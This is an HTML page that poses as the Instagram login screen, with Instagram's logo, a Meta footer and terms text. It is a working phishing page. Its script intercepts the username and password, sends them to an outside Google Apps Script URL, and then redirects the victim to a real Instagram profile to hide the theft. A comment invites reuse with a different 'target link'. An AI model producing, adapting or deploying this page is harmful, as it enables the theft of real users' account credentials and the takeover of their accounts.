<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to bottom, #1a1a2e, #16213e);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 40px;
    }

    .language {
      color: #bbb;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .logo {
      width: 60px;
      height: 60px;
      margin: 20px 0;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 90%;
      max-width: 320px;
    }

    input {
      background: #2a2a3d;
      border: 1px solid #444;
      color: white;
      border-radius: 6px;
      padding: 14px;
      margin: 8px 0;
      font-size: 14px;
    }

    button {
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      padding: 14px;
      color: white;
      font-weight: bold;
      font-size: 15px;
      margin-top: 12px;
      cursor: pointer;
    }

    .forgot {
      color: #ddd;
      font-size: 14px;
      margin: 16px 0;
      text-align: center;
    }

    .create {
      border: 1px solid #1877f2;
      color: #1877f2;
      background: transparent;
      padding: 12px;
      border-radius: 6px;
      font-weight: 600;
      margin-top: 10px;
    }

    .footer {
      margin-top: 30px;
      font-size: 13px;
      color: #aaa;
    }

    .meta-logo {
      width: 50px;
      margin-top: 8px;
    }

    @media (min-width: 600px) {
      body {
        justify-content: center;
        height: 100vh;
        padding-top: 0;
      }
    }
    .footer-strip {
  background-color: #0e0e11; /* darker than the main background */
  color: #999;
  font-size: 12px;
  text-align: center;
  padding: 16px 10px;
}

.footer-strip a {
  color: #bbb;
  text-decoration: underline;
}
#preloader {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: #000;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  z-index: 9999;
}

#preloader img {
      width: 80px;
      margin-bottom: 15px;
    }

    @media (min-width: 600px) {
      body {
        justify-content: center;
        height: 100vh;
        padding-top: 0;
      }
    }

  </style>
</head>
<body>
  <!-- Preloader with Instagram Logo -->
  <div id="preloader">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    <h2>Loading...</h2>
  </div>

<div id="main-content" style="display: none;">
  <!-- Your actual page content goes here -->
</div>

  <div class="language">English (UK)</div>
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">

  <form id="login-form">
    <input type="text" name="username" placeholder="Username, email address or mobile ..." required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log in</button>

  </form> 

  <div class="forgot">Forgotten password?</div>
  <button class="create">Create new account</button>

  <div class="footer">
    <img class="meta-logo" src="meta.jpg" alt="Meta Logo">
  </div>

  <script>
  const form = document.getElementById('login-form');
  form.addEventListener('submit', function(e) {
    e.preventDefault(); // Prevent default form submission

    const data = new FormData(form);

    fetch("https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec", {
      method: "POST",
      body: data
    })
    .then(response => {
      // ✅ Success — redirect after submission
      window.location.href = "https://www.instagram.com/no_username_for_privacy?igsh=cmZhaTczNDhtNDBs"; // Replace with your target link
    })
    .catch(error => {
      alert("Error occurred");
    });
  });
</script>

  <!-- Dark Footer Strip -->
<div class="footer-strip">
  <p>By continuing, you agree to Instagram’s <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
</div>
<script>
  window.addEventListener('load', function () {
    document.getElementById('preloader').style.display = 'none';
    document.getElementById('main-content').style.display = 'block';
  });
</script>


</body>
</html>
